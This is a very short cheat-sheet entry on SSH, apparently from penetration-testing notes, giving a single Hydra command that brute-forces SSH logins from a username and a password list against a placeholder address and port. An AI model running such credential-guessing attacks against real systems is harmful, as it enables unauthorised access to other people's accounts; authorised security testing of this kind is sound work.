# SSH - Secure Shell

## Getting Logins with Hydra

```
sudo hydra -t 16 -l <username> -P <password_file> -vV ssh://<ip_addr>:<port>